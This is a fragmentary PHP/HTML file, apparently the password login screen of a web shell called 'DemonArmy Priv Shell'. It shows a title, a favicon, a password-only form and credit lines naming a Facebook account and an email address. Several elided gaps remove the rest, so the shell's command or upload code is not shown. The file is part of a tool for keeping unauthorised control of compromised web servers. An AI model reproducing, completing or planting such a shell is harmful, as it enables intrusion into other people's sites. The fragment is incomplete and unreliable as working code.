...
?>
<title>DemonArmy</title>
<link rel="icon" href="https://www.jing.fm/clipimg/full/112-1123444_angel-devil-heart-tattoo-red-wings-horns-devil.png"><meta name="theme-color" content="black"> </meta> <!--Ga ngehek ga makan--> 
...
<form enctype="multipart/form-data" method="post">
  <td align="center">
     <center><p class="blink_text" style="font-size:50px;color:red;text-shadow: 0px 0px 20px #00ffff , 0px 0px 20px #DF0101;font-family:Kelly Slab;"></font></center>
          <br>      
      <input type="password" name="password" placeholder="demonarmy611@gmail.com">
      <input type="submit" value="LOGIN">
      
      <br>

<h1><font class="Skranji" style="color:white;font-family:'Kelly Slab';font-size: 15px;">DemonArmy <font color="red">Priv Shell</h1>
      <br>
...
?>
<!DOCTYPE html><html><head><link href="" rel="stylesheet" type="text/css"><title>DemonArmy</title>
...
</head><body> <?php echo'<div style="color:#ef6c00;margin-top:0;"><h1><center>DemonArmy PrivShell</center></h1></div>';
...
echo'<br><center>&copy; 2021 - <a href="https://www.facebook.com/Maulmaou">demonarmy611@gmail.com</a>.</center><br>';?>